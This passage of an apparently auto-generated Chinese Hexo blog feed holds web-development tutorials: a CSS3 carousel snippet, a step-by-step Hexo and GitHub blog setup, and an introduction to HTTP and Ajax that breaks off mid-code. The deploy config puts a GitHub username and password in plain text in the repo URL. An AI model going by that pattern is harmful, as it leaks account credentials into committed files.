class="line">&#125;</span><br></pre></td></tr></table></figure><p>字体图标<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;link rel=<span class="string">"stylesheet"</span> href=<span class="string">"../fonts/font-awesome-4.4.0/css/font-awesome.css"</span>/&gt;</span><br></pre></td></tr></table></figure></p><p>定制自已的字体图标库</p><ul><li><a href="http://iconfont.cn/" target="_blank" rel="noopener">http://iconfont.cn/</a></li><li><a href="https://icomoon.io/" target="_blank" rel="noopener">https://icomoon.io/</a></li></ul><h2 id="切割轮播图-28"><a href="#切割轮播图-28" class="headerlink" title="切割轮播图(28)"></a>切割轮播图(28)</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="string">'body'</span>)</span><br><span class="line">.on(<span class="string">'click'</span>,<span class="string">'.prev'</span>,<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="comment">/*上一张*/</span></span><br><span class="line">    index ++;</span><br><span class="line">    $(<span class="string">'.view li'</span>).css(&#123;<span class="string">'transition'</span>:<span class="string">'all 1s'</span>,<span class="string">'transform'</span>:<span class="string">'rotateX('</span>+index*<span class="number">90</span>+<span class="string">'deg)'</span>&#125;).each(<span class="function"><span class="keyword">function</span>(<span class="params">i,t</span>)</span>&#123;</span><br><span class="line">        $(<span class="keyword">this</span>).css(<span class="string">'transition-delay'</span>,i*<span class="number">0.25</span>+<span class="string">'s'</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;)</span><br><span class="line">.on(<span class="string">'click'</span>,<span class="string">'.next'</span>,<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="comment">/*下一张*/</span></span><br><span class="line">    index --;</span><br><span class="line">    $(<span class="string">'.view li'</span>).css(&#123;<span class="string">'transition'</span>:<span class="string">'all 1s'</span>,<span class="string">'transform'</span>:<span class="string">'rotateX('</span>+index*<span class="number">90</span>+<span class="string">'deg)'</span>&#125;).each(<span class="function"><span class="keyword">function</span>(<span class="params">i,t</span>)</span>&#123;</span><br><span class="line">        $(<span class="keyword">this</span>).css(<span class="string">'transition-delay'</span>,i*<span class="number">0.25</span>+<span class="string">'s'</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h3 id="兼容性"><a href="#兼容性" class="headerlink" title="兼容性"></a>兼容性</h3><ul><li><a href="http://caniuse.com/" target="_blank" rel="noopener">http://caniuse.com/</a><ul><li>可查询CSS3各特性的支持程度，一般兼容性处理的常见方法是为属性添加私有前缀</li></ul></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;私有前缀&quot;&gt;&lt;a href=&quot;#私有前缀&quot; class=&quot;headerlink&quot; title=&quot;私有前缀&quot;&gt;&lt;/a&gt;私有前缀&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;在pc端开发的时候 使用css3属性 最好加上私有前缀&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;-webkit-border-radius: 50%;&lt;/code&gt;&lt;ul&gt;
&lt;li&gt;谷歌&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;-moz-border-radius: 50%;&lt;/code&gt;&lt;ul&gt;
&lt;li&gt;火狐&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;-o-border-radius: 50%;&lt;/code&gt;&lt;ul&gt;
&lt;li&gt;欧鹏&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;-ms-border-radius:50%;&lt;/code&gt;&lt;ul&gt;
&lt;li&gt;IE&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
      <category term="CSS3系列" scheme="http://yoursite.com/categories/CSS3%E7%B3%BB%E5%88%97/"/>
    
    
      <category term="CSS3" scheme="http://yoursite.com/tags/CSS3/"/>
    
  </entry>
  
  <entry>
    <title>Hexo博客搭建</title>
    <link href="http://yoursite.com/2015/12/28/Hexo%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/"/>
    <id>http://yoursite.com/2015/12/28/Hexo博客搭建/</id>
    <published>2015-12-27T16:00:00.000Z</published>
    <updated>2018-06-01T08:05:11.809Z</updated>
    
    <content type="html"><![CDATA[<p>Hexo+github可以随心所欲的部署属于自己的博客。</p><h2 id="Hexo-博客搭建步骤"><a href="#Hexo-博客搭建步骤" class="headerlink" title="Hexo 博客搭建步骤"></a>Hexo 博客搭建步骤</h2><h2 id="搭建博客，首先需要安装-node-环境；"><a href="#搭建博客，首先需要安装-node-环境；" class="headerlink" title="搭建博客，首先需要安装 node 环境；"></a>搭建博客，首先需要安装 node 环境；</h2><ul><li>测试安装成功与否：打开终端，输入 node -v, 有输出版本结果则安装成功。</li><li>安装node环境的时候，已经自动安装了 npm 命令行工具，不需要单独安装。</li><li>可以通过 npm -v 测试npm是否可用</li></ul><p>npm 是一个用来安装和管理 Node 包和前端包的一个工具。</p><h3 id="npm-的两层含义"><a href="#npm-的两层含义" class="headerlink" title="npm 的两层含义"></a>npm 的两层含义</h3><ul><li>npm网站：<a href="https://www.npmjs.com/" target="_blank" rel="noopener">https://www.npmjs.com/</a><ul><li>一个提供了一个用来共享或者检索的一个平台</li><li>二是托管 node 环境或者浏览器环境用到的一些第三方包</li></ul></li><li>是一个命令行工具，可以用来下载 npm 网站上托管的包<ul><li>CLI：Command Line Interface 命令行接口</li><li>GUI：图形化接口</li></ul></li></ul><h3 id="npm-基本使用"><a href="#npm-基本使用" class="headerlink" title="npm 基本使用"></a>npm 基本使用</h3><a id="more"></a><h4 id="本地安装"><a href="#本地安装" class="headerlink" title="本地安装"></a>本地安装</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ npm install [--save] 包名</span><br></pre></td></tr></table></figure><p>一般是在项目中，安装项目使用的依赖包,就可以在终端中，切换到项目的根目录，然后执行 <code>npm install 包名</code>，npm 工具会自动将这个包下载下来然后放到 node_modules 目录中。<code>node_modules</code> 目录如果不存在会新建，如果已存在，则直接将下载的包放到该目录中。</p><h4 id="包说明文件：package-json"><a href="#包说明文件：package-json" class="headerlink" title="包说明文件：package.json"></a>包说明文件：package.json</h4><p>包说明文件其实就是一个产品的说明书：<code>package.json</code> 文件。该文件一般只存在于项目的根路径下，可以通过 <code>npm init</code> 命令使用向导的形式创建该文件。</p><p>该文件中描述了项目的一些元数据，例如 <code>name、version、author</code>等信息。</p><p>其中有一个非常重要的属性，叫做：<code>dependencies</code>，该属性是一个对象，里面保存了当前项目的依赖项，该字段一般不要手动修改，它需要结合 <code>npm install --save 包名</code> 来使用，只要在安装的时候加上<code>--save</code> 参数就会自动将包依赖项添加到该属性中，很方便。</p><p>甚至还可以完全把 <code>node_modules</code> 目录删除掉，只要 <code>package.json</code>文件还在，就可以执行 <code>npm install</code> 安装包说明文件中的所有的依赖项。执行 <code>npm install</code> 命令的时候，它会自动查询当前目录下的 <code>package.json</code> 文件，然后找到里面的 <code>dependencies</code> 属性，依次下载到 <code>node_modules</code> 目录下。</p><p>建议使用 npm 的时候，都先初始化一个 <code>package.json</code> 文件，然后安装包的时候最好都加上 <code>--save</code> 参数，将依赖项添加到包说明文件中。</p><h4 id="全局安装"><a href="#全局安装" class="headerlink" title="全局安装"></a>全局安装</h4><p>全局安装：一般用于安装一些命令行工具（这些工具也是基于Node开发的。）</p><p>全局安装使用 <code>npm install --global 包名（工具名）</code>，在任意目录执行该命令都可以。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm i -g hexo-cli</span><br></pre></td></tr></table></figure><p>可以通过 <code>npm root -g</code> 查看全局包安装目录。</p><h2 id="安装-git-环境；"><a href="#安装-git-环境；" class="headerlink" title="安装 git 环境；"></a>安装 <code>git</code> 环境；</h2><p><a href="https://gitforwindows.org/" target="_blank" rel="noopener">下载地址：</a></p><h3 id="初始设置"><a href="#初始设置" class="headerlink" title="初始设置"></a>初始设置</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ git config --global user.name <span class="string">"yourname"</span></span><br><span class="line">$ git config --global user.email <span class="string">"your_email@example.com"</span></span><br></pre></td></tr></table></figure><h2 id="全局安装-hexo-cli"><a href="#全局安装-hexo-cli" class="headerlink" title="全局安装 hexo-cli"></a>全局安装 <code>hexo-cli</code></h2><p>在终端的任意目录输入 <code>npm install -g hexo-cli</code> 然后回车执行等待全局安装成功</p><p>通过输入 <code>hexo --version</code> 如果看到输入一大堆的版本号就说明安装成功了，Hexo 是一个命令行应用程序</p><h2 id="初始化一个博客存储目录"><a href="#初始化一个博客存储目录" class="headerlink" title="初始化一个博客存储目录"></a>初始化一个博客存储目录</h2><p>通过输入 <code>hexp init 博客项目存储目录</code></p><p>Hexo 会在执行该命令的目录下生成一个博客项目，初始化博客项目的过程需要联网</p><p>通过终端进入刚才创建的博客项目目录，然后在该目录下输入 <code>npm install</code> 回车等待执行结束</p><h2 id="启动本地服务器，查看博客内容"><a href="#启动本地服务器，查看博客内容" class="headerlink" title="启动本地服务器，查看博客内容"></a>启动本地服务器，查看博客内容</h2><p>输入 <code>hexo server</code>回车执行，这一执行会在本地启动一个服务器，然后通过 <code>http://localhost:4000</code> / <code>localhost:4000</code> 就可以访问创建的博客项目 (如果此时4000端口号被占用，也可以通过 hexo server -p 5000 切换到端口号为5000，随即访问<code>http://localhost:5000</code> / <code>localhost:5000</code>访问创建的博客项目)</p><h2 id="创建博文"><a href="#创建博文" class="headerlink" title="创建博文"></a>创建博文</h2><p>进入博客项目，输入 <code>hexo new 文章名称</code> 创建博文</p><p>这个命令会自动在 source/_posts/ 目录下生成一个 文章名称.md 文件</p><h2 id="生成静态文件：hexo-generate"><a href="#生成静态文件：hexo-generate" class="headerlink" title="生成静态文件：hexo generate"></a>生成静态文件：<code>hexo generate</code></h2><p>该命令会自动在项目的根目录下的 public 目录下降静态文件放进去</p><h2 id="配置主题页"><a href="#配置主题页" class="headerlink" title="配置主题页"></a>配置主题页</h2><p>根据我个人所选的主题介绍。进入博客根目录，打开_config开始配置，注意：在配置主题页的时候需要图片的url，需要在<a href="https://portal.qiniu.com/" target="_blank" rel="noopener">七头云CDN</a>注册；</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"># Site</span><br><span class="line">title: HongqinMa  # 配置博客标题</span><br><span class="line">subtitle: <span class="string">"博客标签"</span></span><br><span class="line">description: <span class="string">"马红琴在 Github 上的个人博客"</span></span><br><span class="line">author: Hongqin Ma</span><br><span class="line">header-img: <span class="comment">//ofy7k3v4s.bkt.clouddn.com/mbanner.png  #</span></span><br><span class="line">email: hongqin_ma@126.com  # 邮箱地址</span><br><span class="line">keyword: Hiraku, HongqinMa, javascript, html, css, nodejs  #SEO搜索引擎查找关键词</span><br><span class="line">favicon: <span class="comment">//ofy7k3v4s.bkt.clouddn.com/mylogo.png  # 博客网站图标</span></span><br><span class="line"># RSS:</span><br><span class="line">weibo_username: Hiraku_Ma #微博账户名</span><br><span class="line">zhihu_username: HirakuMa #知乎账户名</span><br><span class="line">github_username: HongqinMa #github账户名</span><br><span class="line">twitter_username: HongqinMa #Twitter账户名</span><br><span class="line">facebook_username: Hiraku #Facebook账户名</span><br><span class="line">sidebar-about-description: 拼着一切代价，奔你的前程。 # 侧边栏签名</span><br><span class="line">sidebar-avatar: http:<span class="comment">//ofy7k3v4s.bkt.clouddn.com/photo.jpg # 侧边栏头像</span></span><br><span class="line">cdn-url: "https://ofy7k3v4s.bkt.clouddn.com/" # 我写的是七头云的域名地址</span><br><span class="line">theme: hexo-theme-Anisina  # 主题名称</span><br><span class="line">friends: [</span><br><span class="line">  &#123;</span><br><span class="line">    title: <span class="string">"掘金"</span>,</span><br><span class="line">    href: <span class="string">"http://gold.xitu.io/"</span></span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    title: <span class="string">"segmentfault"</span>,</span><br><span class="line">    href: <span class="string">"https://segmentfault.com/"</span></span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    title: <span class="string">"简书"</span>,</span><br><span class="line">    href: <span class="string">"http://www.jianshu.com/users/1cbb94e5ed4d/latest_articles"</span></span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    title: <span class="string">"七牛云"</span>,</span><br><span class="line">    href: <span class="string">"https://portal.qiniu.com/"</span></span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    title: <span class="string">"博客园"</span>,</span><br><span class="line">    href: <span class="string">"https://home.cnblogs.com/"</span></span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    title: <span class="string">"Awesomes"</span>,</span><br><span class="line">    href: <span class="string">"https://www.awesomes.cn/"</span></span><br><span class="line">  &#125;</span><br><span class="line">]</span><br><span class="line">duoshuo_username: Hiraku #这里需要注册多说或者主题作者：haojen Ma 文档中的另外一种，作用都一样 ，用来评论的；</span><br><span class="line">deploy: </span><br><span class="line">  type: git # 快速部署</span><br><span class="line">  repo: https:<span class="comment">//github用户名:github密码@github.com/HongqinMa/HongqinMa.github.io.git</span></span><br></pre></td></tr></table></figure><h3 id="快速部署"><a href="#快速部署" class="headerlink" title="快速部署"></a>快速部署</h3><ol><li>修改配置文件</li><li>在项目根路径下执行 <code>npm install hexo-deployer-git --save</code> 该命令</li><li>接下来就可以直接输入 <code>hexo deploy --generate</code>/简写 <code>hexo d -g</code> 自动发布到 github 上</li></ol><h2 id="更详细介绍如下："><a href="#更详细介绍如下：" class="headerlink" title="更详细介绍如下："></a>更详细介绍如下：</h2><p>如何配置主题（以Next主题为例进行详细说明）</p><p><a href="https://www.jianshu.com/p/3ff20be8574c" target="_blank" rel="noopener">Hexo-Next-主题优化(一)</a><br><a href="https://www.jianshu.com/p/428244cd2caa" target="_blank" rel="noopener">Hexo-Next-主题优化(二)</a><br><a href="https://www.jianshu.com/p/d23d67d318c7" target="_blank" rel="noopener">Hexo-Next-主题优化(三)</a><br><a href="https://www.jianshu.com/p/4ef35521fee9" target="_blank" rel="noopener">Hexo-Next-主题优化(四)</a></p><p>OK，现在可以直接通过<a href="https://honeyyoung.github.io/" target="_blank" rel="noopener">honeyyoung.github.io</a>访问博客了。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Hexo+github可以随心所欲的部署属于自己的博客。&lt;/p&gt;
&lt;h2 id=&quot;Hexo-博客搭建步骤&quot;&gt;&lt;a href=&quot;#Hexo-博客搭建步骤&quot; class=&quot;headerlink&quot; title=&quot;Hexo 博客搭建步骤&quot;&gt;&lt;/a&gt;Hexo 博客搭建步骤&lt;/h2&gt;&lt;h2 id=&quot;搭建博客，首先需要安装-node-环境；&quot;&gt;&lt;a href=&quot;#搭建博客，首先需要安装-node-环境；&quot; class=&quot;headerlink&quot; title=&quot;搭建博客，首先需要安装 node 环境；&quot;&gt;&lt;/a&gt;搭建博客，首先需要安装 node 环境；&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;测试安装成功与否：打开终端，输入 node -v, 有输出版本结果则安装成功。&lt;/li&gt;
&lt;li&gt;安装node环境的时候，已经自动安装了 npm 命令行工具，不需要单独安装。&lt;/li&gt;
&lt;li&gt;可以通过 npm -v 测试npm是否可用&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;npm 是一个用来安装和管理 Node 包和前端包的一个工具。&lt;/p&gt;
&lt;h3 id=&quot;npm-的两层含义&quot;&gt;&lt;a href=&quot;#npm-的两层含义&quot; class=&quot;headerlink&quot; title=&quot;npm 的两层含义&quot;&gt;&lt;/a&gt;npm 的两层含义&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;npm网站：&lt;a href=&quot;https://www.npmjs.com/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.npmjs.com/&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;一个提供了一个用来共享或者检索的一个平台&lt;/li&gt;
&lt;li&gt;二是托管 node 环境或者浏览器环境用到的一些第三方包&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;是一个命令行工具，可以用来下载 npm 网站上托管的包&lt;ul&gt;
&lt;li&gt;CLI：Command Line Interface 命令行接口&lt;/li&gt;
&lt;li&gt;GUI：图形化接口&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&quot;npm-基本使用&quot;&gt;&lt;a href=&quot;#npm-基本使用&quot; class=&quot;headerlink&quot; title=&quot;npm 基本使用&quot;&gt;&lt;/a&gt;npm 基本使用&lt;/h3&gt;
    
    </summary>
    
      <category term="Hexo系列" scheme="http://yoursite.com/categories/Hexo%E7%B3%BB%E5%88%97/"/>
    
    
      <category term="github" scheme="http://yoursite.com/tags/github/"/>
    
      <category term="hexo" scheme="http://yoursite.com/tags/hexo/"/>
    
      <category term="markdown" scheme="http://yoursite.com/tags/markdown/"/>
    
      <category term="npm" scheme="http://yoursite.com/tags/npm/"/>
    
      <category term="tools" scheme="http://yoursite.com/tags/tools/"/>
    
      <category term="blog" scheme="http://yoursite.com/tags/blog/"/>
    
  </entry>
  
  <entry>
    <title>Ajax</title>
    <link href="http://yoursite.com/2015/12/16/Ajax/"/>
    <id>http://yoursite.com/2015/12/16/Ajax/</id>
    <published>2015-12-15T16:00:00.000Z</published>
    <updated>2018-06-01T07:13:48.846Z</updated>
    
    <content type="html"><![CDATA[<h2 id="服务器、网络基础、相关知识介绍"><a href="#服务器、网络基础、相关知识介绍" class="headerlink" title="服务器、网络基础、相关知识介绍"></a>服务器、网络基础、相关知识介绍</h2><h3 id="服务器介绍："><a href="#服务器介绍：" class="headerlink" title="服务器介绍："></a>服务器介绍：</h3><h4 id="常见的服务器软件有："><a href="#常见的服务器软件有：" class="headerlink" title="常见的服务器软件有："></a>常见的服务器软件有：</h4><ul><li>文件服务器：Server-U、FileZilla、VsFTP等（FTP是File Transfer Protocol文件传输协议）；</li><li>数据库服务器：oracle、mysql、SQL server、DB2、ACCESS等；</li><li>邮件服务器：Postfix、Sendmail等；</li><li><strong>HTTP服务器</strong>：Apache、Nginx、IIS、Tomcat、NodeJS等；</li></ul><blockquote><p>按照不同的划分标准，服务可划分为以下类型：</p></blockquote><a id="more"></a><p>(1) 服务器类型</p><ul><li>按 服务类型 可分为：<ul><li>文件服务器</li><li>数据库服务器</li><li>邮件服务器</li><li>Web服务器等；</li></ul></li><li>按 操作系统 可分为：<ul><li>Linux服务器</li><li>Windows服务器等；</li></ul></li><li>按 应用软件 可分为<ul><li>Apache 服务器</li><li>Nginx 服务器</li><li>IIS 服务器</li><li>Tomcat 服务器</li><li>weblogic 服务器</li><li>WebSphere 服务器</li><li>boss 服务器</li><li>Node 服务器等</li></ul></li></ul><p>(2) HTTP服务器</p><ul><li>即网站服务器，主要提供文档(文本、图片、视频、音频)浏览服务，一般安装Apache、Nginx服务器软件。</li><li>HTTP服务器可以结合某一编程语言处理业务逻辑，由此进行的开发，通常称之为<strong>服务端开发</strong>。</li><li>常见的运行在服务端的编程语言包括 php、java、.net、Python、Ruby、Perl等。</li></ul><p>(3) 客户端介绍：</p><ul><li>具有向服务器<strong>索取服务</strong>能力的终端，如比如 手机、电脑等，通过安装不同的客户端软件，可以获取不同的服务，比如通过QQ获得即时通讯服务、通过迅雷获得下载服务等。</li><li>常见的客户端软件：浏览器、QQ、迅雷、Foxmail等。</li><li>以浏览器为宿主环境，结合 HTML、CSS、Javascript等技术，而进行的一系列开发，通常称之为<strong>前端开发</strong>。</li></ul><h2 id="网络基础："><a href="#网络基础：" class="headerlink" title="网络基础："></a>网络基础：</h2><h3 id="IP地址"><a href="#IP地址" class="headerlink" title="IP地址"></a>IP地址</h3><ul><li>所谓IP地址就是给每个连接在互联网上的主机分配的一个32位地址。(就像每部手机能正常通话需要一个号码一样)</li><li>查看本机IP地址 ping、ipconfig、ifconfig（linux）</li></ul><h3 id="域名"><a href="#域名" class="headerlink" title="域名"></a>域名</h3><ul><li>由于IP地址基于数字，不方便记忆，于是便用域名来代替IP地址，域名是一个IP地址的“面具”</li><li>查看域名对应的IP地址 ping</li></ul><h3 id="DNS服务"><a href="#DNS服务" class="headerlink" title="DNS服务"></a>DNS服务</h3><ul><li>DNS（Domain Name System）因特网上作为域名和IP地址相互映射的一个分布式数据库，能够使用户更方便的访问互联网，而不用去记住能够被机器直接读取的IP数串。</li><li>简单的说就是记录IP地址和域名之间对应关系的服务。</li><li>查找优先级 本机 hosts 文件、DNS服务器</li><li>ipconfig /flushdns 刷新DNS</li></ul><h3 id="端口"><a href="#端口" class="headerlink" title="端口"></a>端口</h3><ul><li>端口号是计算机与外界通讯交流的出口，每个端口对应不同的服务。现实生活中，银行不同的窗口办理不同的业务。</li><li>查看端口占用情况 <code>netstat -an</code></li><li>常见端口号 80、8080、3306、21、22</li></ul><h2 id="软件架构"><a href="#软件架构" class="headerlink" title="软件架构"></a>软件架构</h2><h3 id="C-S结构"><a href="#C-S结构" class="headerlink" title="C/S结构"></a>C/S结构</h3><blockquote><p>即Client、Server</p></blockquote><ul><li>在C/S结构的情况下，不同的服务需要安装不同的客户端软件，</li><li>比如QQ、迅雷、Foxmail 这种情况下安装的软件会越来越多，同时也有许多弊端，比如A出差，需要在B电脑上查收邮件，但是B电脑并未安装Foxmail等类似的客户端软件，这样不得不先去下载Foxmail，非常不方便。</li></ul><h3 id="B-S结构"><a href="#B-S结构" class="headerlink" title="B/S结构"></a>B/S结构</h3><blockquote><p>即Broswer、Server</p></blockquote><ul><li>解决了C/S所带来的不便</li><li>将所有的服务都可以通过浏览器来完成（因为基本所有浏览器都安装了浏览器），但B/S也有一些不利，比如操作稳定性、流畅度等方面相对较弱。</li></ul><h2 id="网络传输协议"><a href="#网络传输协议" class="headerlink" title="网络传输协议"></a>网络传输协议</h2><h3 id="常见协议"><a href="#常见协议" class="headerlink" title="常见协议"></a>常见协议</h3><ul><li>HTTP、HTTPS 超文本传输协议</li><li>FTP 文件传输协议</li><li>SMTP 简单邮件传输协议</li></ul><h3 id="http协议"><a href="#http协议" class="headerlink" title="http协议"></a>http协议</h3><ul><li>超文本传输协议（HTTP，HyperText Transfer Protocol) 网站是基于HTTP协议的，例如网站的图片、CSS、JS等都是基于HTTP协议进行传输的。</li><li>HTML Hypertext Markup Language</li><li>HTTP协议是由从客户机到服务器的请求(Request)和从服务器到客户机的响应(Response)进行了约束和规范。即HTTP协议主要由请求和响应构成。</li></ul><blockquote><p>常用请求方法 <strong>POST</strong>、<strong>GET</strong>、PUT、DELETE</p></blockquote><h4 id="请求由-4-部分组成"><a href="#请求由-4-部分组成" class="headerlink" title="请求由 4 部分组成"></a>请求由 4 部分组成</h4><ul><li>HTTP 请求方法或 “动作”</li><li>正在请求的 URL</li><li>一个可选的请求头集合。其中可能包括身份验证信息</li><li>一个可选的请求体</li></ul><p><strong>请求头</strong></p><p>由请求方式、请求URL和协议版本构成</p><ul><li><code>GET /day01/code/login.php?username=123&amp;password=123 HTTP/1.1</code></li><li><code>POST /day01/code/login.php HTTP/1.1</code></li></ul><p><strong>请求行</strong></p><ul><li><code>Host：localhost</code><ul><li>请求的主机，发出请求的页面所在的域</li></ul></li><li><code>Cache-Control：max-age=0</code><ul><li>控制缓存</li></ul></li><li><code>Accept</code><ul><li>/ 接受的文档MIME类型</li></ul></li><li><code>User-Agent</code><ul><li>很重要，浏览器的用户代理字符串</li></ul></li><li><code>Referer</code><ul><li>从哪个URL跳转过来的，发出请求的页面 URL</li></ul></li><li><code>Accept-Encoding</code><ul><li>可接受的压缩格式</li></ul></li><li><code>If-None-Match</code><ul><li>记录服务器响应的ETag值，用于控制缓存,此值是由服务器自动生成的</li></ul></li><li><code>If-Modified-Since</code><ul><li>记录服务器响应的Last-Modified值,此值是由服务器自动生成的</li></ul></li><li><code>Accept-Charset</code><ul><li>浏览器能够显示的字符集</li></ul></li><li><code>Accept-Language</code><ul><li>浏览器当前设置的语言</li></ul></li><li><code>Connection</code><ul><li>浏览器和服务器之间连接的类型</li></ul></li><li><code>Cookie</code><ul><li>当前页面设置的任何 Cookie</li></ul></li></ul><p><strong>请求主体</strong></p><ul><li>即传递给服务端的数据</li><li>注：当以post形式提交表单的时候，请求头里会设置</li><li><code>Content-Type: application/x-www-form-urlencoded</code>，以get形式当不需要</li></ul><h3 id="响应和响应报文"><a href="#响应和响应报文" class="headerlink" title="响应和响应报文"></a>响应和响应报文</h3><p>响应由服务器发出，其规范格式为：状态行、响应头、响应主体。</p><blockquote><p>服务器返回的 HTTP 响应包含 3 部分</p></blockquote><ul><li>一个数字和文字组成的状态码，用来显示请求的成功和失败</li><li>一个响应头集合</li><li>响应主体</li></ul><p><strong>状态行</strong></p><p>由协议版本号、状态码和状态信息构成 <code>HTTP/1.1 200 OK</code></p><p><strong>响应头</strong></p><ul><li><code>Date ：</code><ul><li>响应时间</li></ul></li><li><code>Server ：</code><ul><li>服务器信息</li></ul></li><li><code>Last-Modified ：</code><ul><li>资源最后修改时间 由服务器自动生成</li></ul></li><li><code>ETag ：</code><ul><li>资源修改后生成的唯一标识 由服务器自动生成</li></ul></li><li><code>Content-Length ：</code><ul><li>响应主体长度</li></ul></li><li><code>Content-Type ：</code><ul><li>响应资源的类型</li></ul></li></ul><p><strong>响应主体</strong></p><p>即服务端返回给客户端的内容；</p><p>状态码，常见的有:</p><ul><li>200代表成功</li><li>304文档未修改</li><li>403没有权限</li><li>404未找到</li><li>500服务器错误</li></ul><h2 id="JavaScript-原生的-Ajax"><a href="#JavaScript-原生的-Ajax" class="headerlink" title="JavaScript 原生的 Ajax"></a>JavaScript 原生的 Ajax</h2><p>Ajax 的技术核心是 <code>XMLHttpRequest</code> 对象。AJAX 不是一门的新的语言，而是对现有技术的综合利用。本质是在HTTP协议的基础上以异步的方式与服务器进行通信。</p><h3 id="异步"><a href="#异步" class="headerlink" title="异步"></a>异步</h3><blockquote><p>指某段程序执行时不会阻塞其它程序执行，其表现形式为程序的执行顺序不依赖程序本身的书写顺序，相反则为同步。</p></blockquote><p><strong>其优势在于不阻塞程序的执行，从而提升整体执行效率。</strong></p><h3 id="XMLHttpRequest-对象"><a href="#XMLHttpRequest-对象" class="headerlink" title="XMLHttpRequest 对象"></a>XMLHttpRequest 对象</h3><p>浏览器内建对象，用于在后台与服务器通信(交换数据) ，由此我们便可实现对网页的部分更新，而不是刷新整个页面。</p><blockquote><p>HTTP请求3个组成部分与XMLHttpRequest方法的对应关系</p></blockquote><ul><li>请求行 xhr.open(‘post’,’01.php’);</li><li>请求头 xhr.setRequestHeader(‘Content-Type’,’application/x-www-form-urlencoded’); get请求可以不设置</li><li>请求主体 xhr.send(“name=xjj&amp;age=10”); get 请求方式可以传空</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 适用于 IE7 之前的版本</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">createXHR</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> <span class="built_in">arguments</span>.callee.activeXString != <span class="string">"string"</span>) &#123;</span><br><span class="line">      <span class="keyword">var</span> versions = [</span><br><span class="line">        <span class="string">"MSXML2.XMLHttp.6.0"</span>,</span><br><span class="line">        <span class="string">"MSXML2.XMLHttp.3.0"</span>,</span><br><span class="line">        <span class="string">"MSXML2.XMLHtt"</span></span><br><span class="line">      ], i, len;</span><br><span class="line">      <span class="keyword">for</span> (i = <span 